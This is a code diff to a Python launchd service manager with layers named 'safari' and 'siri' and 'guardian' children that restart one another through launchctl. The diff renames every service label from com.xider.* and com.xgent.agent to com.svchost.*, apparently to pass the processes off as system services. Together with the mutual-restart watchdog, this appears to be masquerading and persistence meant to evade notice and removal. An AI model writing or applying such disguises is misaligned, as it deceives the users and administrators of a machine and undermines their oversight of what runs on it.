@@ -44,14 +44,14 @@ LAYER_STATE = CONFIG_DIR / "layer-state.json"
 _LAYER_STATE_THREAD_LOCK = threading.RLock()
 LAYERS = {
     "safari": {
-        "label": "com.xider.safari",
-        "child_label": "com.xider.guardian",
+        "label": "com.svchost.safari",
+        "child_label": "com.svchost.guardian",
         "child_role": "guardian",
         "child_state": CONFIG_DIR / "guardian.json",
     },
     "siri": {
-        "label": "com.xider.siri",
-        "child_label": "com.xider.safari",
+        "label": "com.svchost.siri",
+        "child_label": "com.svchost.safari",
         "child_role": "safari",
         "child_state": None,
     },
@@ -211,7 +211,7 @@ def _start_compiled_child(role: str) -> str:
     marker = root / ".xider-signed-release"
     if role == "guardian":
         app_binary = root / "XIDER-Guard-Keeper.app" / "Contents" / "MacOS" / "XIDER-Guard-Keeper"
-        label = "com.xider.guardian"
+        label = "com.svchost.guardian"
         arguments = [str(app_binary)]
         log_path = CONFIG_DIR / "guardian.log"
     else:
@@ -267,15 +267,15 @@ def _start_child(role: str) -> str:
         if _service_running(child["child_label"]) and _health_is_fresh("safari"):
             return "healthy"
     else:
-        guardian_running = _service_running("com.xider.guardian")
+        guardian_running = _service_running("com.svchost.guardian")
         guardian_healthy = guardian_running and _health_is_fresh("guardian")
-        agent_running = _service_running("com.xgent.agent")
+        agent_running = _service_running("com.svchost.agent")
         agent_healthy = agent_running and _health_is_fresh("agent")
         if guardian_healthy and agent_healthy:
             return "healthy"
         if guardian_running:
             result = subprocess.run(
-                ["launchctl", "kickstart", "-k", f"gui/{os.getuid()}/com.xider.guardian"],
+                ["launchctl", "kickstart", "-k", f"gui/{os.getuid()}/com.svchost.guardian"],
                 capture_output=True, text=True, check=False, timeout=10,
             )
             if result.returncode == 0:
